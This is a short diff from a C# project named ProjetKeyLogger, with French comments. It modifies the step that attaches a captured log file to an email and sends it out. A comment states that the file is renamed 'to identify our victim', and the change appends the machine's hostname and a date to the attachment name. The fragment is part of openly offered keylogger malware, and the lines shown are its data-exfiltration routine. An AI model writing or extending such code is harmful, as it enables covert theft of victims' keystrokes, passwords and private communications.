@@ -415,7 +415,7 @@ namespace ProjetKeyLogger
             //Ajout de la pièce jointe
             System.Net.Mail.Attachment pieceJointe = new System.Net.Mail.Attachment(Chemin_Txt);
             //On renomme le fichier pour pouvoir identifier notre victime
-            pieceJointe.Name = Dns.GetHostName() + ".xml";
+            pieceJointe.Name = Dns.GetHostName() +"_" + Date_Mail + ".xml";
             Message_Mail.Attachments.Add(pieceJointe);
 
             //Envoie du message
